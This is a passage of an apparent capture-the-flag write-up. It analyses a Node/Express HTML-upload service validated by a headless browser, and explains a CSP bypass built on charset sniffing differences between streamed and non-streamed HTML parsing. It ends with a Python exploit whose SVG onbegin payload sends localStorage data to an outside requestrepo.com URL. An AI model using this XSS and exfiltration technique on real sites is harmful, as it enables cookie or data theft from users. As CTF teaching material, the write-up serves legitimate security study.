</span></span><span style=display:flex><span>        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#a6e22e>e</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>finally</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>context</span>) <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>context</span>.<span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>valid</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Setup Express
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>port</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>3001</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>express</span>.<span style=color:#a6e22e>urlencoded</span>({ <span style=color:#a6e22e>extended</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span> }));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/&#39;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>sendFile</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#39;index.html&#39;</span>));
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#39;/upload&#39;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>html</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>html</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;No html.&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>html</span>.<span style=color:#a6e22e>trim</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>html</span>.<span style=color:#a6e22e>startsWith</span>(<span style=color:#e6db74>&#39;&lt;html&gt;&#39;</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;Invalid html.&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e>// fast sanity check
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>html</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#e6db74>&#39;&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src \&#39;none\&#39;&#34;&gt;&#39;</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;No CSP.&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>btoa</span>(<span style=color:#a6e22e>html</span>);
</span></span><span style=display:flex><span>    <span style=color:#75715e>// check again, more strictly...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>validate</span>(<span style=color:#e6db74>&#39;data:text/html;base64,&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>html</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;Failed validation.&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>id</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>randomBytes</span>(<span style=color:#ae81ff>10</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#e6db74>&#39;hex&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>client</span>.<span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>id</span>, <span style=color:#a6e22e>html</span>, { <span style=color:#a6e22e>EX</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>300</span> });
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`&lt;a href=&#34;/upload/</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>id</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;&gt;File uploaded!&lt;/a&gt;`</span>);
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/upload/:id&#39;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>id</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>id</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>client</span>.<span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>id</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>data</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>404</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;File not found.&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>from</span>(<span style=color:#a6e22e>data</span>, <span style=color:#e6db74>&#39;base64&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#a6e22e>html</span>);
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>port</span>, () =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Server listening on port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>port</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>The code is pretty straightforward, i will focus my attention mostly on the <code>validate</code> function and the checks present inside the <code>/upload</code> route.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#39;/upload&#39;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>html</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>html</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;No html.&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>html</span>.<span style=color:#a6e22e>trim</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>html</span>.<span style=color:#a6e22e>startsWith</span>(<span style=color:#e6db74>&#39;&lt;html&gt;&#39;</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;Invalid html.&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e>// fast sanity check
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>html</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#e6db74>&#39;&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src \&#39;none\&#39;&#34;&gt;&#39;</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;No CSP.&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>btoa</span>(<span style=color:#a6e22e>html</span>);
</span></span><span style=display:flex><span>    <span style=color:#75715e>// check again, more strictly...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>validate</span>(<span style=color:#e6db74>&#39;data:text/html;base64,&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>html</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;Failed validation.&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>id</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>randomBytes</span>(<span style=color:#ae81ff>10</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#e6db74>&#39;hex&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>client</span>.<span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>id</span>, <span style=color:#a6e22e>html</span>, { <span style=color:#a6e22e>EX</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>300</span> });
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`&lt;a href=&#34;/upload/</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>id</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;&gt;File uploaded!&lt;/a&gt;`</span>);
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>This code basically checks whetever the html document starts with <code>&lt;html></code> and if the html includes the meta tag that declares the csp and it validates the html by base64 encoding and calling the function <code>validate</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>validate</span>(<span style=color:#a6e22e>url</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>valid</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>context</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>context</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>browser</span>.<span style=color:#a6e22e>createBrowserContext</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>page</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>context</span>.<span style=color:#a6e22e>newPage</span>();
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>setDefaultTimeout</span>(<span style=color:#ae81ff>2000</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// no shenanigans!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>setJavaScriptEnabled</span>(<span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// disallow making any requests
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>setRequestInterception</span>(<span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>reqCount</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>on</span>(<span style=color:#e6db74>&#39;request&#39;</span>, <span style=color:#a6e22e>interceptedRequest</span> =&gt; {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>reqCount</span><span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>interceptedRequest</span>.<span style=color:#a6e22e>isInterceptResolutionHandled</span>()) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>reqCount</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>interceptedRequest</span>.<span style=color:#a6e22e>abort</span>();
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>interceptedRequest</span>.<span style=color:#66d9ef>continue</span>();
</span></span><span style=display:flex><span>        });
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`visiting </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>url</span><span style=color:#e6db74>}</span><span style=color:#e6db74>...`</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#66d9ef>goto</span>(<span style=color:#a6e22e>url</span>, { <span style=color:#a6e22e>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3000</span>, <span style=color:#a6e22e>waitUntil</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;domcontentloaded&#39;</span> });
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>valid</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>evaluate</span>((<span style=color:#a6e22e>s</span>) =&gt; {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// check CSP tag is at the start
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>// check no script tags or frames
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>// check no event handlers
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>return</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#39;head&#39;</span>).<span style=color:#a6e22e>firstElementChild</span>.<span style=color:#a6e22e>outerHTML</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>`&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src &#39;none&#39;&#34;&gt;`</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>&amp;&amp;</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#39;script, noscript, frame, iframe, object, embed&#39;</span>) <span style=color:#f92672>===</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#a6e22e>s</span>) <span style=color:#f92672>===</span> <span style=color:#66d9ef>null</span>
</span></span><span style=display:flex><span>        }, <span style=color:#a6e22e>EVENT_SELECTOR</span>) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>reqCount</span> <span style=color:#f92672>===</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#a6e22e>e</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>finally</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>context</span>) <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>context</span>.<span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>valid</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Here’s a breakdown of what this function does</p><ol><li><strong>Function Declaration</strong>:</li></ol><ul><li>The function <code>validate</code> is declared as an asynchronous function that takes a <code>url</code> as an argument.</li></ul><ol><li><strong>Variable Initialization</strong>:<ul><li>Initializes a boolean variable <code>valid</code> to <code>false</code> and a variable <code>context</code> to hold the browser context.</li></ul></li><li><strong>Try Block</strong>:<ul><li>Creates a new browser context and a new page within that context.</li><li>Sets the default timeout for page operations to 2000 milliseconds.</li></ul></li><li><strong>Disable JavaScript</strong>:<ul><li>Disables JavaScript execution on the page to prevent any dynamic content manipulation.</li></ul></li><li><strong>Request Interception</strong>:<ul><li>Enables request interception to control network requests.</li><li>Initializes a request counter <code>reqCount</code>.</li><li>Sets up an event listener for <code>request</code> events:<ul><li>Increments the request counter.</li><li>Aborts any request if more than one request is made.</li></ul></li></ul></li><li><strong>Navigate to URL</strong>:<ul><li>Logs the URL being visited.</li><li>Navigates to the specified URL with a timeout of 3000 milliseconds and waits until the DOM content is loaded.</li></ul></li><li><strong>Evaluate Page Content</strong>:<ul><li>Evaluates the page content to check:<ul><li>The first element in the <code>&lt;head></code> is a specific CSP meta tag.</li><li>There are no <code>&lt;script></code>, <code>&lt;noscript></code>, <code>&lt;frame></code>, <code>&lt;iframe></code>, <code>&lt;object></code>, or <code>&lt;embed></code> elements.</li><li>There are no elements with event handlers specified in <code>EVENT_SELECTOR</code>.</li></ul></li><li>Sets <code>valid</code> to <code>true</code> if all conditions are met and only one request was made.</li></ul></li><li><strong>Catch Block</strong>:<ul><li>Catches and logs any errors that occur during the try block.</li></ul></li><li><strong>Finally Block</strong>:<ul><li>Ensures the browser context is closed if it was created.</li></ul></li><li><strong>Return Statement</strong>:</li></ol><ul><li>Returns the <code>valid</code> boolean indicating whether the URL passed the validation checks.</li></ul><p>So we have to follow this rules in order for our html document to be uploaded, but that means that the first child of the head tag has to be the csp thus not allowing us to perform an xss.</p><p>I first tried to see if it was possible to use <code>dom clobbering</code> in order to bypass the check made by <code>querySelector</code> but unfortunately we can’t clobber querySelector because it will parse the dom and retrieve the <code>head</code> tag and won’t even keep in consideration names or attributes of a specific tag.</p><p>Fortunately the vulnerability here relays in a subtle part of the code, a recent sonar research pointed out how not setting the <code>charset</code> in the <code>Content-Type</code> could result in a xss.</p><p><a href=https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/ target=_blank>https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/</a></p><p><strong>After 24hours an hint was released stating:</strong></p><blockquote><p>You may want to look for a parsing differential in streamed and non-streamed HTML parsing.</p></blockquote><p>I’ve never heard of streamed and non-streamed html but i quickly found some blogs about it, and one especially caught my attention</p><p><a href=https://frontendmasters.com/blog/streaming-html/ target=_blank>https://frontendmasters.com/blog/streaming-html/</a></p><p><a href=https://dev.to/tigt/the-weirdly-obscure-art-of-streamed-html-4gc2 target=_blank>https://dev.to/tigt/the-weirdly-obscure-art-of-streamed-html-4gc2</a>
<a href="https://lamplightdev.com/blog/2024/01/10/streaming-html-out-of-order-without-javascript/?ck_subscriber_id=2246502080" target=_blank>https://lamplightdev.com/blog/2024/01/10/streaming-html-out-of-order-without-javascript/?ck_subscriber_id=2246502080</a></p><style>.callout{background:#2a2a2a;padding:.5em 1.25em;border-radius:5px;margin-bottom:20px;box-shadow:0 2px 10px rgba(0,0,0,.2);color:#e0e0e0;cursor:pointer;transition:all .3s ease-out;overflow:hidden}.callout-header{display:flex;align-items:center;flex-wrap:wrap}.callout-header div{display:inline-flex;align-items:center;margin-right:10px}.callout-header .emoji{font-size:1.2em;margin-right:.5em}.callout-inner{margin-left:1em;max-height:0;overflow:hidden;transition:max-height .3s ease-out,opacity .3s ease-out;opacity:0;flex-basis:100%}.callout.expanded .callout-inner{max-height:100px;opacity:1}.toggle-btn{background:0 0;border:none;color:#e0e0e0;font-size:1.25em;margin-right:10px;cursor:pointer;transition:transform .3s ease}.expanded .toggle-btn{transform:rotate(90deg)}@media(max-width:767px){.callout{padding:.5em .75em .5em .6em}.callout-inner{margin-left:.5em}}</style><div class=callout onclick=toggleCallout(this)><div class=callout-header><button class=toggle-btn>></button><div class=emoji>✅</div><div>streaming HTML</div></div><div class=callout-inner>The <strong>concept of streaming HTML</strong> - sending HTML from a web server to a browser in chunks as it is generated - is <strong>nothing new</strong>.It seemed to take a back seat at the beginning of the age of modern front-end frameworks and Single Page Applications - where the entire page was generated in the browser - but as the pendulum swings back towards server-side rendering with full stack frameworks, <strong>streaming responses are becoming popular again</strong>. The <strong>advantages of streaming HTML</strong> over waiting for the entire response to be generated before sending it to the browser are clear - you can <strong>render something immediately</strong> to indicate to the user that something is happening, and you can start downloading assets like CSS and JavaScript earlier, while you <strong>wait for the more time consuming parts of the response</strong> to be generated.</div></div><script>function toggleCallout(e){const t=e.querySelector(".callout-inner"),n=e.classList.contains("expanded");n?t.style.maxHeight=null:t.style.maxHeight=t.scrollHeight+"px",e.classList.toggle("expanded")}</script><p>Suppose we upload a very large HTML file, one that will be sent over multiple TCP packets (which means it needs to weigh more than 65KB). The Chrome browser, to improve performance, won&rsquo;t wait to render the full document. Instead, it will render the first part and then the remaining part.</p><p>However, the hint clearly talks about parsing discrepancies between streamed and non-streamed HTML. But where do we encounter the non-streamed HTML? 🤔</p><p>It turns out that when our payload is validated, it&rsquo;s rendered with the <code>data:uri</code> scheme. This means it will parse the document all at once, in a non-streamed mode.</p><p>But what could go wrong, right? Chrome is just trying to improve the webpage&rsquo;s performance and doesn&rsquo;t modify anything.</p><p>We know we need to exploit the missing charset information, so what would happen if the two chunks have different charsets?</p><p>Obviously, it&rsquo;s not possible to have two different charsets in a static HTML document, but we can make the browser interpret the first chunk&rsquo;s charset and then declare a different charset in the second chunk.</p><p>This exploit takes advantage of Chrome&rsquo;s HTML parsing. We can find more about parsing here:</p><p><a href=https://html.spec.whatwg.org/multipage/parsing.html target=_blank>https://html.spec.whatwg.org/multipage/parsing.html</a></p><p>The browser will read the first 1024 bytes to see if there&rsquo;s any declared charset. If not, it will try to sniff the charset, guessing it similarly to how it guesses content-type.</p><p><img src=/images/sekai/2.png alt=2.png></p><p>So we can take advantage of this behaviour in the following way, we create a big html document which will be parsed in two different way. We abuse the charset sniffing mechanism so that when the browser will have to parse the first chunk it will have to guess the charset, and in the second chunk we declare the charset, in the following way on one hand on the <code>data:uri</code> non-streamed parsing it will effectively see that there is a charset declared and therefore use that as the charset, while on chrome it will first parse the first large data guessing the charset, then when it will parse the second chunk we declare the charset which won’t change the first chunk charset, chrome won’t change the previous encoding but just continue on.</p><p>Thanks to Sonar research we have to just create a valid poc where the first chunk will use <code>ISO-2022-JP</code> and the second chunk will use <code>UTF-8</code> charset</p><p>Here’s what we are going to need</p><p><img src=/images/sekai/3.png alt=3.png></p><h2 id=poc>POC</h2><p>So let’s just recap every key point in order to trigger an xss:</p><ul><li>We create an html document</li><li>We open the head tag and we put in a comment a valid <code>ISO-2022-JP</code> encoding sequence from the above</li><li>We declare right after the csp</li><li>We send junk datas in a comment just to fill the tcp packet and therefore to complete the first chunk</li><li>We didn’t close the head tag before so let’s put a charset meta tag and close it</li><li>We open the body and put a payload which will trigger xss(i searched for non blacklisted event handlers and tags)</li></ul><p>The exploit is the following but let me explain what happens in detail</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#0xAlessandro was here</span>
</span></span><span style=display:flex><span>c1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;&lt;html&gt;&lt;head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;!-- </span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>$@ aa --&gt;&#39;&#39;&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src &#39;none&#39;&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74></span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>(B &lt;!-- test --&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>(B&lt;!-- &#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>64000</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;--&gt;&#34;</span><span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&lt;!--&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>100</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;--&gt;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c2 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;svg&gt;&lt;animate onbegin=&#34;fetch(`https://s9cs3dwb.requestrepo.com?c=${localStorage.getItem(&#39;flag&#39;)}`)&#34; attributeName=&#34;x&#34; dur=&#34;1s&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/html&gt;&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>html <span style=color:#f92672>=</span> c1 <span style=color:#f92672>+</span> c2
